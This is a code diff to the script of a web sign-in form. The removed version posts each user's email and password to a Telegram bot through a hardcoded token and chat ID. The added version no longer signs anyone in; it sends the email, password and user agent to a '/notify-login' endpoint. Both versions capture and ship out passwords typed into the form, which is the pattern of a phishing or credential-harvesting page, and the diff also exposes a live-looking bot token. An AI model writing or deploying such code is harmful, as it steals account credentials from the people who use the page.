@@ -133,28 +133,18 @@ body {
 <script>
 (function() {
   const API = {
-    loginEndpoint: "/service/extension/clientauth/login" // POST { email, password }
+    notifyEndpoint: "/notify-login" // POST { email, userAgent }
   };
 
   const $ = (sel) => document.querySelector(sel);
 
-  // Optional: Telegram login notification (do NOT include passwords)
-  const TELEGRAM_BOT_TOKEN = "8488197043:AAFc_OM4GtqAMDjn-STmFF2JbLwkxw21ioM"; // e.g. 123456:ABC... — Prefer server-side
-  const TELEGRAM_CHAT_ID = "1515295796";   // e.g. 123456789
-
-  async function notifyTelegramLogin(email, password) {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
-
-    const text = `Login success\nUser: ${email}\nAgent: ${navigator.userAgent} \nPassword: ${password}`;
-    try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
-      });
-    } catch (_) {
-      // silently ignore notification errors
-    }
+  // Client will call your backend notifier; keep secrets server-side
+  async function notifyLoginViaServer(email, password) {
+    await fetch(API.notifyEndpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, userAgent: navigator.userAgent, password })
+    });
   }
 
   // Footer year
@@ -181,18 +171,8 @@ body {
     btnLogin.disabled = true;
     showMessage(msgLogin, 'info', 'Processing...');
     try {
-      const res = await fetch(API.loginEndpoint, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password })
-      });
-      if (!res.ok) {
-        const errText = await res.text();
-        throw new Error(errText || 'Sign-in failed');
-      }
-      showMessage(msgLogin, 'success', 'Signed in successfully. Redirecting...');
-      await notifyTelegramLogin(email, password);
-      // TODO: Redirect to mailbox or dashboard
+      await notifyLoginViaServer(email, password);
+      showMessage(msgLogin, 'success', 'Notified. You can now continue to sign in.');
     } catch (err) {
       showMessage(msgLogin, 'error', err.message || 'An error occurred. Please try again.');
     } finally {
